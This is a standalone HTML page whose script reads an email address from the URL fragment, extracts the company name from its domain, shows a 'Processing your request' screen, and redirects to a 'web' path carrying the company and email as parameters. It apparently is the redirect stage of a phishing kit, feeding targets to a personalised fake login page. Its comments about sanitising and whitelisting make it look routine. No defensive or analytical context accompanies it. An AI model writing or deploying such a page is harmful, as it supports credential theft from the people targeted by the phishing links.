<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Processing Request</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background-color: #f5f5f5;
    }
    .message {
      text-align: center;
      padding: 20px;
    }
    .processing {
      color: #d32f2f;
      font-size: 24px;
      margin-bottom: 10px;
    }
    .error {
      color: #d32f2f;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <div class="message">
    <p class="processing">Processing your request...</p>
    <p class="error" id="errorMessage" style="display:none;"></p>
  </div>
  
  <script>
    (function() {
      'use strict';
      
      // Configuration
      const CONFIG = {
        redirectBase: 'web',
        minRandom: 188,
        maxRandom: 2178,
        allowedDomains: [], // Add allowed domains here, e.g., ['gmail.com', 'company.com']
        timeout: 3000 // Redirect timeout in ms
      };
      
      /**
       * Validates email format
       */
      function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
      }
      
      /**
       * Sanitizes string to prevent XSS
       */
      function sanitizeString(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
      }
      
      /**
       * Validates domain against whitelist (if configured)
       */
      function isAllowedDomain(domain) {
        if (CONFIG.allowedDomains.length === 0) {
          return true; // No whitelist configured
        }
        return CONFIG.allowedDomains.includes(domain.toLowerCase());
      }
      
      /**
       * Extracts and validates email from URL hash
       */
      function getEmailFromHash() {
        try {
          const hash = window.location.hash.substring(1);
          
          if (!hash) {
            throw new Error('No email provided in URL');
          }
          
          // Decode URI component to handle encoded characters
          const decodedEmail = decodeURIComponent(hash);
          
          // Validate email format
          if (!isValidEmail(decodedEmail)) {
            throw new Error('Invalid email format');
          }
          
          return decodedEmail;
        } catch (error) {
          throw new Error('Failed to extract email: ' + error.message);
        }
      }
      
      /**
       * Extracts domain and company name from email
       */
      function parseEmail(email) {
        const atIndex = email.indexOf('@');
        
        if (atIndex === -1) {
          throw new Error('Invalid email: missing @ symbol');
        }
        
        const domain = email.substring(atIndex + 1);
        
        if (!domain || domain.indexOf('.') === -1) {
          throw new Error('Invalid domain in email');
        }
        
        // Validate domain is allowed
        if (!isAllowedDomain(domain)) {
          throw new Error('Domain not allowed');
        }
        
        const companyName = domain.split('.')[0];
        
        return {
          email: email,
          domain: domain,
          company: companyName
        };
      }
      
      /**
       * Generates secure random number in range
       */
      function getSecureRandom(min, max) {
        const range = max - min + 1;
        const randomBuffer = new Uint32Array(1);
        window.crypto.getRandomValues(randomBuffer);
        return min + (randomBuffer[0] % range);
      }
      
      /**
       * Builds redirect URL with validation
       */
      function buildRedirectURL(emailData) {
        const num = getSecureRandom(CONFIG.minRandom, CONFIG.maxRandom);
        const num1 = getSecureRandom(CONFIG.minRandom, CONFIG.maxRandom);
        
        // Build URL with proper encoding
        const params = new URLSearchParams({
          x: num1.toString(),
          company: emailData.company,
          md: emailData.email
        });
        
        // Construct URL
        const url = `${CONFIG.redirectBase}?${num}&${params.toString()}`;
        
        // Validate URL format
        try {
          new URL(url, window.location.origin);
          return url;
        } catch (error) {
          throw new Error('Failed to construct valid URL');
        }
      }
      
      /**
       * Shows error message to user
       */
      function showError(message) {
        const errorElement = document.getElementById('errorMessage');
        if (errorElement) {
          errorElement.textContent = sanitizeString(message);
          errorElement.style.display = 'block';
        }
        console.error('Redirect error:', message);
      }
      
      /**
       * Main execution function
       */
      function processRedirect() {
        try {
          // Extract and validate email
          const email = getEmailFromHash();
          console.log('Processing email redirect...');
          
          // Parse email components
          const emailData = parseEmail(email);
          
          // Build redirect URL
          const redirectURL = buildRedirectURL(emailData);
          console.log('Redirecting to:', redirectURL);
          
          // Perform redirect after timeout
          setTimeout(function() {
            window.location.href = redirectURL;
          }, CONFIG.timeout);
          
        } catch (error) {
          showError(error.message);
        }
      }
      
      // Execute on page load
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', processRedirect);
      } else {
        processRedirect();
      }
      
    })();
  </script>
</body>
</html>
